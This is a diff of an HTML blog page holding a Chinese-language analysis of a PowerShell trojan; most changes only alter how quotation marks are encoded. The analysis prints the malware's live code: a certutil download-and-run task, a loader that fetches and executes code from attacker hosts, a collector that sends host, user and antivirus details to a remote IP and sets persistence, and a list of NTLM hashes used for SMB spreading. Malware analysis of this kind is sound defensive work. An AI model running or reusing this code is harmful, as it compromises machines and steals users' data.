@@ -95,7 +95,6 @@
 <p>第一个动作，创建一个名为<code>Certificate</code>的任务计划，在七点开始，每隔一小时执行一次以下命令：</p>
 <pre tabindex="0"><code>
 cmd.exe /c (cd %temp%&amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&gt;nul&amp;expand -r v.dat&gt;nul&amp;v.bat&gt;nul&amp;del v.dat v.bat&gt;nul)
-
 </code></pre><p>由于目前<code>cert.beahh.com</code>已经无法访问，所以进行下一个powershell分析环节。</p>
 <p>首先，<code>powershell -nop -w hidden -ep bypass -e </code>后接着就是base64编码的powershell代码，并且以Bypass作为当前执行策略。</p>
 <p>Windows中的powershell执行策略：</p>
@@ -115,8 +114,8 @@ MachinePolicy       Undefined
 {
 [System.Threading.Thread]::Sleep(200000);
 [string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
-$q = [System.Net.WebRequest]::Create(&quot;http://new.beahh.com/startup.php?ver=1&amp;mac=&quot;+$m+&quot;&amp;ver=&quot;+(Get-WmiObject -Class Win32_OperatingSystem).version+&quot;&amp;bit=&quot;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
-$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace &quot;##&quot;;
+$q = [System.Net.WebRequest]::Create(&#34;http://new.beahh.com/startup.php?ver=1&amp;mac=&#34;+$m+&#34;&amp;ver=&#34;+(Get-WmiObject -Class Win32_OperatingSystem).version+&#34;&amp;bit=&#34;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
+$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace &#34;##&#34;;
 $c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));
 iex $c;
 [System.Threading.Thread]::Sleep(1000000);
@@ -124,11 +123,11 @@ iex $c;
 </code></pre><p>外部是一个循环，将Sleep去除后，可以看到调用了<code>Invoke-Expression</code>，<code>Invoke-Expression</code>是一个能将变量的内容当作powershell表达式执行的函数。</p>
 <p>而iex只是<code>Invoke-Expression</code>的别名。</p>
 <p>下面简单演示几个例子：</p>
-<pre tabindex="0"><code>PS C:\Users\Rvn0xsy&gt; iex &quot;Write-Host Rvn0xsy&quot;
+<pre tabindex="0"><code>PS C:\Users\Rvn0xsy&gt; iex &#34;Write-Host Rvn0xsy&#34;
 Rvn0xsy
 PS C:\Users\Rvn0xsy&gt; Write-Host Rvn0xsy
 Rvn0xsy
-PS C:\Users\Rvn0xsy&gt; Invoke-Expression &quot;Write-Host Rvn0xsy&quot;
+PS C:\Users\Rvn0xsy&gt; Invoke-Expression &#34;Write-Host Rvn0xsy&#34;
 Rvn0xsy
 PS C:\Users\Rvn0xsy&gt;
 </code></pre><p>将上述的木马脚本中iex替换成Write-Host即可：</p>
@@ -136,8 +135,8 @@ PS C:\Users\Rvn0xsy&gt;
 {
 
 [string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
-$q = [System.Net.WebRequest]::Create(&quot;http://new.beahh.com/startup.php?ver=1&amp;mac=&quot;+$m+&quot;&amp;ver=&quot;+(Get-WmiObject -Class Win32_OperatingSystem).version+&quot;&amp;bit=&quot;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
-$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace &quot;##&quot;;
+$q = [System.Net.WebRequest]::Create(&#34;http://new.beahh.com/startup.php?ver=1&amp;mac=&#34;+$m+&#34;&amp;ver=&#34;+(Get-WmiObject -Class Win32_OperatingSystem).version+&#34;&amp;bit=&#34;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
+$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace &#34;##&#34;;
 $c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));
 Write-Host $c;
 }
@@ -154,9 +153,9 @@ Write-Host $c;
 <h3 id="解密第四层">解密第四层</h3>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4e75dcae-4f5f-11ec-b69a-00d861bf4abb.png" alt=""></p>
 <p>第四次好像混淆的更加厉害来，但是不影响我们的分析，先看首行：</p>
-<pre tabindex="0"><code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')((('[string]3CHav = U'+'ABUAB[string]....
+<pre tabindex="0"><code> . ( $EnV:CoMsPec[4,26,25]-JoIN&#39;&#39;)(((&#39;[string]3CHav = U&#39;+&#39;ABUAB[string]....
 </code></pre><p>其中它是以<code>. (表达式)(表达式)</code>来执行的，于是我想到了另外一种函数调用的可能：</p>
-<pre tabindex="0"><code>PS C:\Users\Rvn0xsy&gt; . Write-Host &quot;Rvn0xsy&quot;
+<pre tabindex="0"><code>PS C:\Users\Rvn0xsy&gt; . Write-Host &#34;Rvn0xsy&#34;
 Rvn0xsy
 PS C:\Users\Rvn0xsy&gt;
 </code></pre><p>这样也能执行，所以我判断<code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>就是<code>iex</code>或者<code>Invoke-Expression</code>，我将<code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>改为<code>Write-Host</code>直接执行：</p>
@@ -166,15 +165,15 @@ PS C:\Users\Rvn0xsy&gt;
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4ef7f8c4-4f5f-11ec-8df4-00d861bf4abb.png" alt=""></p>
 <p><code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code> = <code>Iex</code></p>
 <h2 id="0x03-行为分析">0x03 行为分析</h2>
-<pre tabindex="0"><code>[string]$av = &quot;&quot;[string]$avs = &quot;&quot;[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)$avs = (Get-WmiObject -Namesp
-ace root\SecurityCenter2 -Class AntiVirusProduct).displayNameif($avs.GetType().name.IndexOf('Object') -gt -1){for($v = 0; $v -lt $avs.Count; $v++){$av += $avs[$v] + &quot;|&quot;}}else{$av 
-= $avs}try{if((Get-Service zhudongfangyu | Sort -Property Status).Status -eq &quot;Running&quot;){$av += 'ZDFY'}}catch{}#[System.Threading.Thread]::Sleep((Get-Random -Minimum 10000 -Maximum
- 100000))$path = &quot;$env:temp\\ppp.log&quot;[string]$flag = test-path $path$key = &quot;&amp;mac=&quot;+$mac+&quot;&amp;av=&quot;+$av+&quot;&amp;ver=&quot;+(Get-WmiObject -Class Win32_OperatingSystem).version+&quot;&amp;bit=&quot;+(Get-WmiObj
-ect Win32_OperatingSystem).OSArchitecture + &quot;&amp;flag2=&quot; + $flag + &quot;&amp;domain=&quot; + (Get-WmiObject win32_computersystem).Domain + &quot;&amp;user=&quot; + $env:USERNAMEtry{$file = &quot;$env:appdata\\Micro
-soft\\cred.ps1&quot;$size = (Get-ChildItem $file -recurse | Measure-Object -property length -sum).sum$file2 = &quot;$env:ALLUSERSPROFILE\\Microsoft\\cred.ps1&quot;$size2 = (Get-ChildItem $file2 
--recurse | Measure-Object -property length -sum).sum        if(($size -ne 50731) -and ($size2 -ne 50731)){try{$url = 'http://172.104.177.202/new.dat?xl' + $key(New-Object System.N
-et.WebClient).DownloadFile($url,&quot;$file&quot;)}catch{}&amp;cmd.exe /c schtasks /create /sc MINUTE /mo 60 /st 07:00:00 /tn Credentials /tr &quot;powershell -nop -w hidden -ep bypass -f %appdata%\
-Microsoft\cred.ps1&quot; /F}}catch{}[System.Threading.Thread]::Sleep(3000)Stop-Process -Force -processname powershell
+<pre tabindex="0"><code>[string]$av = &#34;&#34;[string]$avs = &#34;&#34;[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)$avs = (Get-WmiObject -Namesp
+ace root\SecurityCenter2 -Class AntiVirusProduct).displayNameif($avs.GetType().name.IndexOf(&#39;Object&#39;) -gt -1){for($v = 0; $v -lt $avs.Count; $v++){$av += $avs[$v] + &#34;|&#34;}}else{$av 
+= $avs}try{if((Get-Service zhudongfangyu | Sort -Property Status).Status -eq &#34;Running&#34;){$av += &#39;ZDFY&#39;}}catch{}#[System.Threading.Thread]::Sleep((Get-Random -Minimum 10000 -Maximum
+ 100000))$path = &#34;$env:temp\\ppp.log&#34;[string]$flag = test-path $path$key = &#34;&amp;mac=&#34;+$mac+&#34;&amp;av=&#34;+$av+&#34;&amp;ver=&#34;+(Get-WmiObject -Class Win32_OperatingSystem).version+&#34;&amp;bit=&#34;+(Get-WmiObj
+ect Win32_OperatingSystem).OSArchitecture + &#34;&amp;flag2=&#34; + $flag + &#34;&amp;domain=&#34; + (Get-WmiObject win32_computersystem).Domain + &#34;&amp;user=&#34; + $env:USERNAMEtry{$file = &#34;$env:appdata\\Micro
+soft\\cred.ps1&#34;$size = (Get-ChildItem $file -recurse | Measure-Object -property length -sum).sum$file2 = &#34;$env:ALLUSERSPROFILE\\Microsoft\\cred.ps1&#34;$size2 = (Get-ChildItem $file2 
+-recurse | Measure-Object -property length -sum).sum        if(($size -ne 50731) -and ($size2 -ne 50731)){try{$url = &#39;http://172.104.177.202/new.dat?xl&#39; + $key(New-Object System.N
+et.WebClient).DownloadFile($url,&#34;$file&#34;)}catch{}&amp;cmd.exe /c schtasks /create /sc MINUTE /mo 60 /st 07:00:00 /tn Credentials /tr &#34;powershell -nop -w hidden -ep bypass -f %appdata%\
+Microsoft\cred.ps1&#34; /F}}catch{}[System.Threading.Thread]::Sleep(3000)Stop-Process -Force -processname powershell
 </code></pre><p>大致意思就是收集本机的操作系统版本、用户名、MAC地址、杀毒软件写入当前环境变量的<code>temp\ppp.log</code>中。</p>
 <p>一般是<code>C:\Users\&lt;USERNAME&gt;\AppData\Local\Temp\ppp.log</code></p>
 <p>然后下载新的powershell文件，到<code>C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\cred.ps1</code>中。</p>
@@ -191,7 +190,7 @@ Microsoft\cred.ps1&quot; /F}}catch{}[System.Threading.Thread]::Sleep(3000)Stop-P
 <p>3.端口扫描，全量1-65535、445、139都会扫描</p>
 <p>4.依赖于445 SMB服务进行传播</p>
 <p>其中，常用的Hash和用户名：</p>
-<pre tabindex="0"><code>[string[]]$global:alluser = @(&quot;administrator&quot;,&quot;admin&quot;)[string[]]$global:allpass = @(&quot;32ed87bdb5fdc5e9cba88547376818d4&quot;,&quot;8846f7eaee8fb117ad06bdd830b7586c&quot;,&quot;7b592e4f8178b4c75788531b2e747687&quot;,&quot;3fa45a060bd2693ae4c05b601d05ca0c&quot;,&quot;69943c5e63b4d2c104dbbcc15138b72b&quot;,&quot;588feb889288fb953b5f094d47d1565c&quot;,&quot;3dbde697d71690a769204beb12283678&quot;,&quot;df54de3f3438343202c1dd523d0265be&quot;,&quot;7ce21f17c0aee7fb9ceba532d0546ad6&quot;,&quot;2d7f1a5a61d3a96fb5159b5eef17adc6&quot;,&quot;6103d9d963c57275dd3533674708e7be&quot;,&quot;579110c49145015c47ecd267657d3174&quot;,&quot;af27efb60c7b238910efe2a7e0676a39&quot;,&quot;259745cb123a52aa2e693aaacca2db52&quot;,&quot;4057b60b514c5402dde3d29a1845c366&quot;,&quot;e8cd0e4a9e89eab931dc5338fcbec54a&quot;,&quot;f1351ac828428d74f6da2968089fc91f&quot;,&quot;b5fe2db507cc5ac540493d48fbd5fe33&quot;,&quot;12bdea0a1cb9486c067deaa851ac1609&quot;,&quot;f9e37e83b83c47a93c2f09f66408631b&quot;,&quot;b23a90d0aad9da3615fafc27a1b8baeb&quot;,&quot;a333f09e72c683f0205049d0db8b81fb&quot;,&quot;ad70819c5bc807280974d80f45982011&quot;,&quot;2d20d252a479f485cdf5e171d93985bf&quot;,&quot;0b6549421b2e7333e0e281f3ba5eea94&quot;,&quot;209c6174da490caeb422f3fa5a7ae634&quot;,&quot;a80c9cc3f8439ada25af064a874efe2d&quot;,&quot;22315d6ed1a7d5f8a7c98c40e9fa2dec&quot;,&quot;b963c57010f218edc2cc3c229b5e4d0f&quot;,&quot;96880159e785de5314803b1169768900&quot;,&quot;8ec60adea316d957d1cf532c5841758d&quot;,&quot;c22b315c040ae6e0efee3518d830362b&quot;,&quot;7a21990fcd3d759941e45c490f143d5f&quot;,&quot;328727b81ca05805a68ef26acb252039&quot;,&quot;31c72c210ecc03d1eae94fa496069448&quot;,&quot;209c6174da490caeb422f3fa5a7ae634&quot;,&quot;674e48b68c5cd0efd8f7e5faa87b3d1e&quot;,&quot;31fc0dc8f7dfad0e8bd7ccc3842f2ce9&quot;,&quot;579110c49145015c47ecd267657d3174&quot;,&quot;f2477a144dff4f216ab81f2ac3e3207d&quot;,&quot;62b26c13b70e7d5a9724710a41e63688&quot;,&quot;5835048ce94ad0564e29a924a03510ef&quot;,&quot;7773c08920232397cae081704964b786&quot;,&quot;a4141712f19e9dd5adf16919bb38a95c&quot;,&quot;b3ec3e03e2a202cbd54fd104b8504fef&quot;,&quot;f9e37e83b83c47a93c2f09f66408631b&quot;,&quot;162e829be112225fedf856e38e1c65fe&quot;,&quot;f67f5e3f66efd7298be6acd32eeeb27c&quot;)
+<pre tabindex="0"><code>[string[]]$global:alluser = @(&#34;administrator&#34;,&#34;admin&#34;)[string[]]$global:allpass = @(&#34;32ed87bdb5fdc5e9cba88547376818d4&#34;,&#34;8846f7eaee8fb117ad06bdd830b7586c&#34;,&#34;7b592e4f8178b4c75788531b2e747687&#34;,&#34;3fa45a060bd2693ae4c05b601d05ca0c&#34;,&#34;69943c5e63b4d2c104dbbcc15138b72b&#34;,&#34;588feb889288fb953b5f094d47d1565c&#34;,&#34;3dbde697d71690a769204beb12283678&#34;,&#34;df54de3f3438343202c1dd523d0265be&#34;,&#34;7ce21f17c0aee7fb9ceba532d0546ad6&#34;,&#34;2d7f1a5a61d3a96fb5159b5eef17adc6&#34;,&#34;6103d9d963c57275dd3533674708e7be&#34;,&#34;579110c49145015c47ecd267657d3174&#34;,&#34;af27efb60c7b238910efe2a7e0676a39&#34;,&#34;259745cb123a52aa2e693aaacca2db52&#34;,&#34;4057b60b514c5402dde3d29a1845c366&#34;,&#34;e8cd0e4a9e89eab931dc5338fcbec54a&#34;,&#34;f1351ac828428d74f6da2968089fc91f&#34;,&#34;b5fe2db507cc5ac540493d48fbd5fe33&#34;,&#34;12bdea0a1cb9486c067deaa851ac1609&#34;,&#34;f9e37e83b83c47a93c2f09f66408631b&#34;,&#34;b23a90d0aad9da3615fafc27a1b8baeb&#34;,&#34;a333f09e72c683f0205049d0db8b81fb&#34;,&#34;ad70819c5bc807280974d80f45982011&#34;,&#34;2d20d252a479f485cdf5e171d93985bf&#34;,&#34;0b6549421b2e7333e0e281f3ba5eea94&#34;,&#34;209c6174da490caeb422f3fa5a7ae634&#34;,&#34;a80c9cc3f8439ada25af064a874efe2d&#34;,&#34;22315d6ed1a7d5f8a7c98c40e9fa2dec&#34;,&#34;b963c57010f218edc2cc3c229b5e4d0f&#34;,&#34;96880159e785de5314803b1169768900&#34;,&#34;8ec60adea316d957d1cf532c5841758d&#34;,&#34;c22b315c040ae6e0efee3518d830362b&#34;,&#34;7a21990fcd3d759941e45c490f143d5f&#34;,&#34;328727b81ca05805a68ef26acb252039&#34;,&#34;31c72c210ecc03d1eae94fa496069448&#34;,&#34;209c6174da490caeb422f3fa5a7ae634&#34;,&#34;674e48b68c5cd0efd8f7e5faa87b3d1e&#34;,&#34;31fc0dc8f7dfad0e8bd7ccc3842f2ce9&#34;,&#34;579110c49145015c47ecd267657d3174&#34;,&#34;f2477a144dff4f216ab81f2ac3e3207d&#34;,&#34;62b26c13b70e7d5a9724710a41e63688&#34;,&#34;5835048ce94ad0564e29a924a03510ef&#34;,&#34;7773c08920232397cae081704964b786&#34;,&#34;a4141712f19e9dd5adf16919bb38a95c&#34;,&#34;b3ec3e03e2a202cbd54fd104b8504fef&#34;,&#34;f9e37e83b83c47a93c2f09f66408631b&#34;,&#34;162e829be112225fedf856e38e1c65fe&#34;,&#34;f67f5e3f66efd7298be6acd32eeeb27c&#34;)
 </code></pre><p>SMB服务传播代码：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/5006062a-4f5f-11ec-a903-00d861bf4abb.png" alt=""></p>
 <p>会上传启动项：<code>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat</code></p>
